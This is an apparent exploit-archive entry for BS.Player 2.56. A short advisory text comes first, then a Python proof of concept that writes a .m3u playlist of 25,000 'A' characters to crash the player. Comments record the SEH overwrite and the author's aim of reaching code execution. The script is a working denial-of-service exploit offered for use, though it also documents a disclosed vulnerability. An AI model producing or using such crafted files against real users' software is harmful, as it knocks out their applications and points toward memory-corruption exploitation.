source:  http://www.securityfocus.com/bid/43502/info

BS.Player is prone to multiple remote denial-of-service vulnerabilities.

An attacker can exploit these issues to cause an affected application to crash, denying service to legitimate users.

BS.Player 2.56 is vulnerable; other versions may also be affected.

#!/usr/bin/python
#
# Exploit Title: BS.Player 2.56 (Build 1043) .m3u and .pls Denial of Service
# Date: September 27, 2010
# Author: modpr0be
# Software Link: http://www.bsplayer.com/bsplayer-setup.exe
# Version: 2.0.0
# Tested on: Windows XP SP3/2003
# CVE : -
 
# How it works?
# Open BS.Player --> Open the Playlist Window --> Load m3u/pls file --> boom!
#
# SEHandler
# bsplayer.00410041
#
# 0012F74C   00410041  A.A.  Pointer to next SEH record
# 0012F750   00410041  A.A.  SE handler
#
# I think this is a kind of unicode exploit. I'm learning this, hope it will run calc, soon.
# btw...thx corelanc0d3r (PVE) for his great exploit writing tutorial ;)
#
 
junk = "\x41" * 25000
 
file = open('blah.m3u','w')  # change it if you want to try the .pls
file.write(junk)
file.close()